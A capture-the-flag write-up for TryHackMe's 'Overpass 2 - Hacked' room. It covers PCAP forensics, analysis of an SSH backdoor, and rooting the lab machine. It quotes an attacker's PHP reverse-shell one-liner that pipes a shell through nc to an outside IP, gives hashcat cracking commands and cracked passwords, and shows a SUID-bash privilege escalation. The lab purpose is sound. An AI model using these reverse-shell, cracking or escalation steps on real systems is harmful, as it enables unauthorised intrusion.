---
Platform:
  - TryHackMe
Difficulty: Easy
Status: Rooted/Finished
Blog Posting: Not Posted
Type: Machine
---
In this writeup we are going to solve the Overpass 2 - Hacked room from TryHackMe.

Link to the Room : [https://tryhackme.com/room/overpass2hacked](https://tryhackme.com/room/overpass2hacked)

  

Lets Start……

  

## Task 1

First Download the Task files given. The given task file is a [PCAP](https://www.solarwinds.com/resources/it-glossary/pcap) file. Open the given pcap file in wireshark.

If we take a look at the traffic, we can see that there is a POST request to `/development/upload.php`.

![[Overpass 2 - Hacked/assets/Untitled.png|Untitled.png]]

Right click on that particular row and follow the TCP stream to see more details about that POST request.

`Right Click → Follow → TCP Stream` ( or ) Select the column and press `ctrl + alt + shift + T` to view the TCP Stream.

![[Overpass 2 - Hacked/assets/Untitled 1.png|Untitled 1.png]]

In the TCP stream we can see that the attacker have uploaded a file named `payload.php` which has the following PHP reverse shell code:

```
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```

Further investigating, If we follow the TCP stream of the packet no 29, we see the password that the attacker used for the user james: `whenevernoteartinstant`.

![[Overpass 2 - Hacked/assets/Untitled 2.png|Untitled 2.png]]

![[Overpass 2 - Hacked/assets/Untitled 3.png|Untitled 3.png]]

And if we scroll down, we can see that the attacker is downloading a ssh-backdoor from `[https://github.com/NinjaJc01/ssh-backdoor](https://github.com/NinjaJc01/ssh-backdoor)`

![[Overpass 2 - Hacked/assets/Untitled 4.png|Untitled 4.png]]

We can also see that the attacker has also viewed the `/etc/shadow` file.

![[Overpass 2 - Hacked/assets/Untitled 5.png|Untitled 5.png]]

I tried to crack these passwords with the [fasttrack.txt](https://raw.githubusercontent.com/drtychai/wordlists/master/fasttrack.txt) word-list. I used hashcat for cracking the passwords.

Command: `hashcat -m 1800` `**hash.txt**` `**./fasttrack.txt**`

I was able to crack the passwords for 4 users:

`paradox: secuirty3`

`szymex: abcd123`

`bee: secret12`

`muirland: 1qaz2wsx`

We have find the answers for all the questions that were asked for the Task 1.

![[Overpass 2 - Hacked/assets/Untitled 6.png|Untitled 6.png]]

Moving on to Task 2

## Task 2

Now we have to analyse the code of the backdoor that we found in the last task. So first I downloaded the source code from [https://github.com/NinjaJc01/ssh-backdoor](https://github.com/NinjaJc01/ssh-backdoor), using the following command

`git clone https://github.com/NinjaJc01/ssh-backdoor.git`

![[Overpass 2 - Hacked/assets/Untitled 7.png|Untitled 7.png]]

After downloading I opened the downloaded `ssh-backdoor` folder in VScode. If we take a look at the `main.go` file, we can see a variable `hash` with a value of `bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3` which is the default hash used by this backdoor.

![[Overpass 2 - Hacked/assets/Untitled 8.png|Untitled 8.png]]

From the main function we can devise that the backdoor is running on port `2222`.

![[Overpass 2 - Hacked/assets/Untitled 9.png|Untitled 9.png]]

Further, if we scroll down, we can see that the backdoor requires a hash for creating backdoor as a parameter with a flag `-a` . If the hash is not given as a parameter then it uses the default hash value that we found above.

![[Overpass 2 - Hacked/assets/Untitled 10.png|Untitled 10.png]]

If we take a look at the TCP stream where we found the backdoor in the last task, we can see that the attacker has given a hash as parameter while he was executing the backdoor. The hash that the attacker used is: `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`

![[Overpass 2 - Hacked/assets/Untitled 11.png|Untitled 11.png]]

On further investigating, if we take a look at the function `passwordHandler` , we can see that the backdoor uses a salt `1c362db832f3f864c8c2fe05f2002a05` to create the password.

![[Overpass 2 - Hacked/assets/Untitled 12.png|Untitled 12.png]]

Now we can crack the hash that the attacker given as a parameter to create the backdoor password using the salt to find the password.

The command to crack the password is :

`hashcat -m 1710 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05 /usr/share/wordlists/rockyou.txt --force -O -w 4`

![[Overpass 2 - Hacked/assets/Untitled 13.png|Untitled 13.png]]

We have cracked the hash and the password is `november16` .

We have find the answers for all the questions that were asked for the Task 2.

![[Overpass 2 - Hacked/assets/Untitled 14.png|Untitled 14.png]]

Moving on to Task 3.

## Task 3

First start the machine. Wait for 5 minutes and give the machine time to start all the services.

After 5 minutes, run a standard nmap scan.

Command: `nmap -A -T4 -v <targetIP>`

![[Overpass 2 - Hacked/assets/Untitled 15.png|Untitled 15.png]]

We can see that there is web-server running on port `80` and the backdoor is running on port `2222`.

If we check the web-server that is running on port `80`, we can see the message `**H4ck3d by CooctusClan**`. Apart from the message there is nothing interesting in the website.

![[Overpass 2 - Hacked/assets/Untitled 16.png|Untitled 16.png]]

Next we can use the backdoor to get access to the target machine.

Command: `ssh james@<target_IP> -p 2222 -oHostKeyAlgorithms=+ssh-rsa`

Use the password that we found in the last task: “november16”

![[Overpass 2 - Hacked/assets/Untitled 17.png|Untitled 17.png]]

Now we got access to the target machine. Now if we check the user directory we can find the user flag.

![[Overpass 2 - Hacked/assets/Untitled 18.png|Untitled 18.png]]

Now we have to find the root flag. According to the hint we have to check whether attacker had left a way to escalate our privileges. So I started to surf through all the directories.

![[Overpass 2 - Hacked/assets/Untitled 19.png|Untitled 19.png]]

In the home directory I found something interesting.

![[Overpass 2 - Hacked/assets/Untitled 20.png|Untitled 20.png]]

It has a `.suid_bash` file. I searched [gtfobins](https://gtfobins.github.io/) for “bash SUID” and found this [https://gtfobins.github.io/gtfobins/bash/#suid](https://gtfobins.github.io/gtfobins/bash/#suid).

![[Overpass 2 - Hacked/assets/Untitled 21.png|Untitled 21.png]]

According to the above explanation, if we execute this `.suid_bash` file with a flag `-p`, we will get back a shell with root privileges.

![[Overpass 2 - Hacked/assets/Untitled 22.png|Untitled 22.png]]

After executing the command: `./.suid_bash -p` , I got back a shell with root privileges.

Now I checked the `/root` directory.

![[Overpass 2 - Hacked/assets/Untitled 23.png|Untitled 23.png]]

We successfully got the root flag.

We have find the answers for all the questions that were asked for the Task 3.

![[Overpass 2 - Hacked/assets/Untitled 24.png|Untitled 24.png]]

  

Thankyou………….